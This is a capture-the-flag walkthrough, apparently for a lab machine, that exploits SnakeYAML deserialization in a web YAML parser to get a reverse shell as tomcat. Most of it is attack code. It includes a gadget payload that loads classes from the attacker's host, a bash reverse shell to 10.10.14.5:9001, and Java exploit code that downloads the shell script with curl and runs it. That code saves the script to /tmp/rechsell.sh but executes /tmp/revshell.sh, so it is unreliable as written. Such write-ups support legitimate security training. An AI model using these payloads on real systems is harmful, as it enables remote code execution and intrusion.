# Foothold

- We can visit the web page and see that this is a yaml parser, when we put random data in it, we get redirected to a web page.
![[Pasted image 20210403055112.png]]
- When we try to parse something we get redirected to a web page, saying the feature is disabled due to security reasons. We can see that this can be an attack vector for us.
![[Pasted image 20210403055220.png]]
- We can see this blog post regarding it :https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858
- We need to `git clone https://github.com/artsploit/yaml-payload.git`
- So to check if the web app is vulnerable to this exploit, run a python server on a random directory and put in the payload
```
!!javax.script.ScriptEngineManager \[  
  !!java.net.URLClassLoader \[\[  
    !!java.net.URL \["http://10.10.14.5:8000"\]  
  \]\]  
\]
```
- We will get a valid response on our local server, and is looking to HEAD in META-INF. (The blog post would define the whole process.)
![[Pasted image 20210403060146.png]]
- We can use the exploit from the git-repo mentioned earlier.

## Creating revshell for upload
- First we need to create a rev shell to upload on the remote machine (Some testing suggested that one-liner revshells weren't working, or maybe I was doing it wrong)
```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'" >> revshell.sh
```
- Move this file to yaml-payload/src folder.
- Spin up a python server in yaml-payload/src folder, so that the base directory has META-INF and the artsploit folder present.
- Add these lines to the exploit file
```java
import java.io.IOException;                                                                    [55/251]
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl http://10.10.14.5:8000/revshell.sh -o /tmp/rechsell.sh");
            Runtime.getRuntime().exec("bash /tmp/revshell.sh");
        } catch (IOException e) {
            e.printStackTrace();

... [snip] ...
```
- To execute this file send in the same request to the parser as earlier
![[Pasted image 20210403061422.png]]
- We get a revershell to tomcat. Make the shell interactive 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+z
stty raw -echo; fg
{Press Enter Twice}
```

